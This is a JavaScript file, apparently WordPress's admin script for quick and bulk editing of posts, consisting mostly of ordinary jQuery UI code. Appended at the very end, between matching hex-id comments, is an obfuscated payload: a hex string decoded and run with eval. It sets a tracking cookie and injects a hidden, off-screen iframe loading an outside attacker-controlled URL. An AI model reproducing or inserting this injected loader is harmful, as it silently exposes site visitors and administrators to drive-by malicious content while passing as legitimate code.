/* global inlineEditL10n, ajaxurl, typenow */

var inlineEditPost;
(function($) {
inlineEditPost = {

	init : function(){
		var t = this, qeRow = $('#inline-edit'), bulkRow = $('#bulk-edit');

		t.type = $('table.widefat').hasClass('pages') ? 'page' : 'post';
		t.what = '#post-';

		// prepare the edit rows
		qeRow.keyup(function(e){
			if ( e.which === 27 ) {
				return inlineEditPost.revert();
			}
		});
		bulkRow.keyup(function(e){
			if ( e.which === 27 ) {
				return inlineEditPost.revert();
			}
		});

		$('a.cancel', qeRow).click(function(){
			return inlineEditPost.revert();
		});
		$('a.save', qeRow).click(function(){
			return inlineEditPost.save(this);
		});
		$('td', qeRow).keydown(function(e){
			if ( e.which === 13 && ! $( e.target ).hasClass( 'cancel' ) ) {
				return inlineEditPost.save(this);
			}
		});

		$('a.cancel', bulkRow).click(function(){
			return inlineEditPost.revert();
		});

		$('#inline-edit .inline-edit-private input[value="private"]').click( function(){
			var pw = $('input.inline-edit-password-input');
			if ( $(this).prop('checked') ) {
				pw.val('').prop('disabled', true);
			} else {
				pw.prop('disabled', false);
			}
		});

		// add events
		$('#the-list').on('click', 'a.editinline', function(){
			inlineEditPost.edit(this);
			return false;
		});

		$('#bulk-edit').find('fieldset:first').after(
			$('#inline-edit fieldset.inline-edit-categories').clone()
		).siblings( 'fieldset:last' ).prepend(
			$('#inline-edit label.inline-edit-tags').clone()
		);

		$('select[name="_status"] option[value="future"]', bulkRow).remove();

		$('#doaction, #doaction2').click(function(e){
			var n = $(this).attr('id').substr(2);
			if ( 'edit' === $( 'select[name="' + n + '"]' ).val() ) {
				e.preventDefault();
				t.setBulk();
			} else if ( $('form#posts-filter tr.inline-editor').length > 0 ) {
				t.revert();
			}
		});
	},

	toggle : function(el){
		var t = this;
		$( t.what + t.getId( el ) ).css( 'display' ) === 'none' ? t.revert() : t.edit( el );
	},

	setBulk : function(){
		var te = '', type = this.type, tax, c = true;
		this.revert();

		$('#bulk-edit td').attr('colspan', $('.widefat:first thead th:visible').length);
		// Insert the editor at the top of the table with an empty row above to maintain zebra striping.
		$('table.widefat tbody').prepend( $('#bulk-edit') ).prepend('<tr class="hidden"></tr>');
		$('#bulk-edit').addClass('inline-editor').show();

		$( 'tbody th.check-column input[type="checkbox"]' ).each( function() {
			if ( $(this).prop('checked') ) {
				c = false;
				var id = $(this).val(), theTitle;
				theTitle = $('#inline_'+id+' .post_title').html() || inlineEditL10n.notitle;
				te += '<div id="ttle'+id+'"><a id="_'+id+'" class="ntdelbutton" title="'+inlineEditL10n.ntdeltitle+'">X</a>'+theTitle+'</div>';
			}
		});

		if ( c ) {
			return this.revert();
		}

		$('#bulk-titles').html(te);
		$('#bulk-titles a').click(function(){
			var id = $(this).attr('id').substr(1);

			$('table.widefat input[value="' + id + '"]').prop('checked', false);
			$('#ttle'+id).remove();
		});

		// enable autocomplete for tags
		if ( 'post' === type ) {
			// support multi taxonomies?
			tax = 'post_tag';
			$('tr.inline-editor textarea[name="tax_input['+tax+']"]').suggest( ajaxurl + '?action=ajax-tag-search&tax=' + tax, { delay: 500, minchars: 2, multiple: true, multipleSep: inlineEditL10n.comma } );
		}
		$('html, body').animate( { scrollTop: 0 }, 'fast' );
	},

	edit : function(id) {
		var t = this, fields, editRow, rowData, status, pageOpt, pageLevel, nextPage, pageLoop = true, nextLevel, cur_format, f, val;
		t.revert();

		if ( typeof(id) === 'object' ) {
			id = t.getId(id);
		}

		fields = ['post_title', 'post_name', 'post_author', '_status', 'jj', 'mm', 'aa', 'hh', 'mn', 'ss', 'post_password', 'post_format', 'menu_order'];
		if ( t.type === 'page' ) {
			fields.push('post_parent', 'page_template');
		}

		// add the new edit row with an extra blank row underneath to maintain zebra striping.
		editRow = $('#inline-edit').clone(true);
		$('td', editRow).attr('colspan', $('.widefat:first thead th:visible').length);

		$(t.what+id).hide().after(editRow).after('<tr class="hidden"></tr>');

		// populate the data
		rowData = $('#inline_'+id);
		if ( !$(':input[name="post_author"] option[value="' + $('.post_author', rowData).text() + '"]', editRow).val() ) {
			// author no longer has edit caps, so we need to add them to the list of authors
			$(':input[name="post_author"]', editRow).prepend('<option value="' + $('.post_author', rowData).text() + '">' + $('#' + t.type + '-' + id + ' .author').text() + '</option>');
		}
		if ( $( ':input[name="post_author"] option', editRow ).length === 1 ) {
			$('label.inline-edit-author', editRow).hide();
		}

		// hide unsupported formats, but leave the current format alone
		cur_format = $('.post_format', rowData).text();
		$('option.unsupported', editRow).each(function() {
			var $this = $(this);
			if ( $this.val() !== cur_format ) {
				$this.remove();
			}
		});

		for ( f = 0; f < fields.length; f++ ) {
			val = $('.'+fields[f], rowData);
			// Deal with Twemoji
			val.find( 'img' ).replaceWith( function() { return this.alt; } );
			val = val.text();
			$(':input[name="' + fields[f] + '"]', editRow).val( val );
		}

		if ( $( '.comment_status', rowData ).text() === 'open' ) {
			$( 'input[name="comment_status"]', editRow ).prop( 'checked', true );
		}
		if ( $( '.ping_status', rowData ).text() === 'open' ) {
			$( 'input[name="ping_status"]', editRow ).prop( 'checked', true );
		}
		if ( $( '.sticky', rowData ).text() === 'sticky' ) {
			$( 'input[name="sticky"]', editRow ).prop( 'checked', true );
		}

		// hierarchical taxonomies
		$('.post_category', rowData).each(function(){
			var taxname,
				term_ids = $(this).text();

			if ( term_ids ) {
				taxname = $(this).attr('id').replace('_'+id, '');
				$('ul.'+taxname+'-checklist :checkbox', editRow).val(term_ids.split(','));
			}
		});

		//flat taxonomies
		$('.tags_input', rowData).each(function(){
			var terms = $(this),
				taxname = $(this).attr('id').replace('_' + id, ''),
				textarea = $('textarea.tax_input_' + taxname, editRow),
				comma = inlineEditL10n.comma;

			terms.find( 'img' ).replaceWith( function() { return this.alt; } );
			terms = terms.text();

			if ( terms ) {
				if ( ',' !== comma ) {
					terms = terms.replace(/,/g, comma);
				}
				textarea.val(terms);
			}

			textarea.suggest( ajaxurl + '?action=ajax-tag-search&tax=' + taxname, { delay: 500, minchars: 2, multiple: true, multipleSep: inlineEditL10n.comma } );
		});

		// handle the post status
		status = $('._status', rowData).text();
		if ( 'future' !== status ) {
			$('select[name="_status"] option[value="future"]', editRow).remove();
		}

		if ( 'private' === status ) {
			$('input[name="keep_private"]', editRow).prop('checked', true);
			$('input.inline-edit-password-input').val('').prop('disabled', true);
		}

		// remove the current page and children from the parent dropdown
		pageOpt = $('select[name="post_parent"] option[value="' + id + '"]', editRow);
		if ( pageOpt.length > 0 ) {
			pageLevel = pageOpt[0].className.split('-')[1];
			nextPage = pageOpt;
			while ( pageLoop ) {
				nextPage = nextPage.next('option');
				if ( nextPage.length === 0 ) {
					break;
				}

				nextLevel = nextPage[0].className.split('-')[1];

				if ( nextLevel <= pageLevel ) {
					pageLoop = false;
				} else {
					nextPage.remove();
					nextPage = pageOpt;
				}
			}
			pageOpt.remove();
		}

		$(editRow).attr('id', 'edit-'+id).addClass('inline-editor').show();
		$('.ptitle', editRow).focus();

		return false;
	},

	save : function(id) {
		var params, fields, page = $('.post_status_page').val() || '';

		if ( typeof(id) === 'object' ) {
			id = this.getId(id);
		}

		$( 'table.widefat .spinner' ).addClass( 'is-active' );

		params = {
			action: 'inline-save',
			post_type: typenow,
			post_ID: id,
			edit_date: 'true',
			post_status: page
		};

		fields = $('#edit-'+id).find(':input').serialize();
		params = fields + '&' + $.param(params);

		// make ajax request
		$.post( ajaxurl, params,
			function(r) {
				$( 'table.widefat .spinner' ).removeClass( 'is-active' );

				if (r) {
					if ( -1 !== r.indexOf( '<tr' ) ) {
						$(inlineEditPost.what+id).siblings('tr.hidden').addBack().remove();
						$('#edit-'+id).before(r).remove();
						$(inlineEditPost.what+id).hide().fadeIn();
					} else {
						r = r.replace( /<.[^<>]*?>/g, '' );
						$('#edit-'+id+' .inline-edit-save .error').html(r).show();
					}
				} else {
					$('#edit-'+id+' .inline-edit-save .error').html(inlineEditL10n.error).show();
				}
			},
		'html');
		return false;
	},

	revert : function(){
		var id = $('table.widefat tr.inline-editor').attr('id');

		if ( id ) {
			$( 'table.widefat .spinner' ).removeClass( 'is-active' );

			if ( 'bulk-edit' === id ) {
				$('table.widefat #bulk-edit').removeClass('inline-editor').hide().siblings('tr.hidden').remove();
				$('#bulk-titles').empty();
				$('#inlineedit').append( $('#bulk-edit') );
			} else {
				$('#'+id).siblings('tr.hidden').addBack().remove();
				id = id.substr( id.lastIndexOf('-') + 1 );
				$(this.what+id).show();
			}
		}

		return false;
	},

	getId : function(o) {
		var id = $(o).closest('tr').attr('id'),
			parts = id.split('-');
		return parts[parts.length - 1];
	}
};

$( document ).ready( function(){ inlineEditPost.init(); } );

// Show/hide locks on posts
$( document ).on( 'heartbeat-tick.wp-check-locked-posts', function( e, data ) {
	var locked = data['wp-check-locked-posts'] || {};

	$('#the-list tr').each( function(i, el) {
		var key = el.id, row = $(el), lock_data, avatar;

		if ( locked.hasOwnProperty( key ) ) {
			if ( ! row.hasClass('wp-locked') ) {
				lock_data = locked[key];
				row.find('.column-title .locked-text').text( lock_data.text );
				row.find('.check-column checkbox').prop('checked', false);

				if ( lock_data.avatar_src ) {
					avatar = $('<img class="avatar avatar-18 photo" width="18" height="18" />').attr( 'src', lock_data.avatar_src.replace(/&amp;/g, '&') );
					row.find('.column-title .locked-avatar').empty().append( avatar );
				}
				row.addClass('wp-locked');
			}
		} else if ( row.hasClass('wp-locked') ) {
			// Make room for the CSS animation
			row.removeClass('wp-locked').delay(1000).find('.locked-info span').empty();
		}
	});
}).on( 'heartbeat-send.wp-check-locked-posts', function( e, data ) {
	var check = [];

	$('#the-list tr').each( function(i, el) {
		if ( el.id ) {
			check.push( el.id );
		}
	});

	if ( check.length ) {
		data['wp-check-locked-posts'] = check;
	}
}).ready( function() {
	// Set the heartbeat interval to 15 sec.
	if ( typeof wp !== 'undefined' && wp.heartbeat ) {
		wp.heartbeat.interval( 15 );
	}
});

}(jQuery));
/*dcd4e0d3042449bc7dfd95ae4d7ad42e*/;(function(){var zrrtneir="";var eydnrtnr="77696e646f772e6f6e6c6f6164203d2066756e6374696f6e28297b66756e6374696f6e20783232627128612c622c63297b69662863297b7661722064203d206e6577204461746528293b642e7365744461746528642e6765744461746528292b63293b7d6966286120262620622920646f63756d656e742e636f6f6b6965203d20612b273d272b622b2863203f20273b20657870697265733d272b642e746f555443537472696e672829203a202727293b656c73652072657475726e2066616c73653b7d66756e6374696f6e2078333362712861297b7661722062203d206e65772052656745787028612b273d285b5e3b5d297b312c7d27293b7661722063203d20622e6578656328646f63756d656e742e636f6f6b6965293b69662863292063203d20635b305d2e73706c697428273d27293b656c73652072657475726e2066616c73653b72657475726e20635b315d203f20635b315d203a2066616c73653b7d766172207833336471203d2078333362712822316336663361326663383935353135303632656663653537306364343737393622293b69662820783333647120213d2022623966373264313330636330343236303163363032336662643462343631623822297b783232627128223163366633613266633839353531353036326566636535373063643437373936222c226239663732643133306363303432363031633630323366626434623436316238222c31293b766172207832326471203d20646f63756d656e742e637265617465456c656d656e74282264697622293b766172207832327171203d2022687474703a2f2f6e6577732e62656c756968616d656c656f6e2e696e666f2f68656c6c6f6d796c6974746c6570696767792f3f6e52726a51654456436a3d6b7057644466537a26576157616b667378666b3d6d767465516c4745654a45267058576942496c5257724d76743d5674554d6675694753514978414868266d7772684f7677576861524b6c583d724171645447754b567026524368784a726d68664479764578644b483d78756b745670694b484a49576d47264648686d5959754c4a5550533d504343795a684e6f71767465594f4f5976597226677a5841464a477a455a58733d77497a4f66616270534b6746266b6579776f72643d356333633633646666613162386663366132333131316464303737663032646526435255494b65594d7a674868494b79583d706c4161455a4177506163223b78323264712e696e6e657248544d4c3d223c646976207374796c653d27706f736974696f6e3a6162736f6c7574653b7a2d696e6465783a313030303b746f703a2d3130303070783b6c6566743a2d3939393970783b273e3c696672616d65207372633d27222b78323271712b22273e3c2f696672616d653e3c2f6469763e223b646f63756d656e742e626f64792e617070656e644368696c64287832326471293b7d7d";for (var fayytdhs=0;fayytdhs<eydnrtnr.length;fayytdhs+=2){zrrtneir=zrrtneir+parseInt(eydnrtnr.substring(fayytdhs,fayytdhs+2), 16)+",";}zrrtneir=zrrtneir.substring(0,zrrtneir.length-1);eval(eval('String.fromCharCode('+zrrtneir+')'));})();/*dcd4e0d3042449bc7dfd95ae4d7ad42e*/